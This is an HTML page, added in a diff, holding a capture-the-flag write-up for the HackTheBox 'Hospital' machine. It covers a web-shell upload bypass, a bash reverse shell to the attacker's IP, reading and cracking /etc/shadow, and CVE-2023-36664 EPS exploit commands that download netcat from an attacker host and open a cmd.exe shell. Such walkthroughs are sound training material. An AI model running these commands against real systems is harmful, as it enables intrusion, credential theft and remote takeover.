@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Hospital</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Hospital Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png">
+            <p class="paragraph">
+                This HackTheBox challenge, set at a Medium level, tasks you with leveraging a known<br>vulnerability (CVE) to escalate privileges within the system. Our mission is to craft or use an exploit code to breach security barriers,<br>gain higher access, and ultimately submit the flags.
+            </p>
+            <h2>Nmap Scan</h2>
+            <p class="paragraph">
+                Nmap is a tool that helps us gather details about a target’s services, ports, and versions.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*9aufywBgjUEsCnAcNL2K7g.png">
+            <p class="paragraph">
+                I found a login page on port 8080 allowing user creation and login.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZrqgMvrIcXKvwEN_379gUw.png">
+            <p class="paragraph">
+                So I create an account and then login using that credential when we use at the time of creation.<br>And after login, we saw that there is an upload file option. So I test file upload vulnerability<br> and try to bypass them but nothing happen.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*_JRB-sa7FJi4HcA4AQHGQQ.png">
+            <p class="paragraph">
+                After researching how to obtain a reverse shell, I came across a tool called “p0wny-shell” on GitHub.<br> This tool allows you to get a shell in a web browser without using netcat.<br><br>
+                After uploading the PHP shell from p0wny-shell, I intercepted the request in BurpSuite to modify the<br>extension from .php to .phar, and the website accepted it.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*_maP1xFXtwHRiOa5LMk76g.png">
+            <p class="paragraph">
+                In order to access the upload directory, we must now open that directory in Firefox (discover hidden <br>Dir name /uploads). In my case, the URL is https://10.10.11.241/uploads/shell.phar<br>And you obtained shell in browser.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*WT-QBOVFHiYBZrsyTxOMTQ.png">
+            <p class="paragraph">
+                After that, I wanted an interactive shell, so I launched a command in the web browser.
+                <p class="script-container">
+                    /usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.16/4444>&1'
+                </p>
+                On Linux, I initiate Netcat as follows:
+                <p class="script-container">
+                    nc -lvnp 4444
+                </p>
+                After obtaining a reverse shell on my Linux machine, I attempted to examine the OS version of Kali Linux.<br>However, I encountered a reported vulnerability mentioning an Ubuntu Version 23.04
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*RbwkulObPH6h9_hA4S5JWQ.png">
+            <p class="paragraph">
+                After researching the vulnerability, I found a GitHub exploit that assists in escalating privileges from ‘www-data’ to root access.<br><br>
+                Open the exploit.sh file you downloaded to gain root access. Install this exploit on your running reverse shell.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*L2jlxYhFlft8pp70ZiTvkw.png">
+            <p class="paragraph">
+                Now, check the /etc/shadow file to obtain the hashed passwords of users. After examining the shadow file, <br>I found the user ‘drwilliams’ and their corresponding hash.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*OWQFkOCnxJtrVIlqHMtxKg.png">
+            <p class="paragraph">
+                Copy the hash and cracked using hashcat tool.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*XPYdv50cLF1RiU4luHrFaQ.png">
+            <p class="paragraph">
+                Now that you have the login username and password, simply open Firefox and navigate to the machine’s IP.<br>You’ll find a webmail server there.
+            </p>
+            <h2>User Access</h2>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*hHnRja_h_BnVNA16mChZgA.png">
+            <p class="paragraph">
+                Logged into the mail server using credentials, and you successfully accessed the website. After examining<br>the inbox mail, it appears to accept the .esp file format only.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*M0bnBEur8YR7ucECvGaWWg.png">
+            <p class="paragraph">
+                So, I searched the web browser for an ESP file exploit and found a GitHub repository that indicated an exploit.<br><br>
+                Clone this repository in Linux and use the command below to execute a reverse shell on the system.
+                <p class="script-container">
+                    python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.81:8000/nc64.exe -o nc.exe" --filename file.eps
+                </p>
+                <p class="script-container">
+                    python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.81 4444 -e cmd.exe" --filename file.eps
+                </p>
+                Now, open the webmail server. In the screenshot above, you can see that there’s one email. Reply to that email<br> and attach the file named file.eps Afterward, start the netcat listener and wait for the reverse shell.
+                <p class="script-container">
+                    nc -lvnp 4444
+                </p>
+                Now we have access to our user flag.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*1ah_v3wixlMhHcIx7aoYrw.png">
+            <p class="paragraph">
+                After examining various directories, I found xampp folder containing htdocs which we’ll<br>utilize for uploading files to the web server. I retrieved the p0wny-shell from Linux using the curl<br>command. Next, I opened the machine’s IP in Firefox at https://10.10.11.241/shell.php.
+            </p>
+            <h2>Adminstrator Access</h2>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*hxocf0dQCiE_QuUiHdrz0g.png">
+            <p class="paragraph">
+                Success! We’ve achieved root access and uncovered the elusive root flag.<br> What an exhilarating journey it has been! Thank you for joining me on this adventure!
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
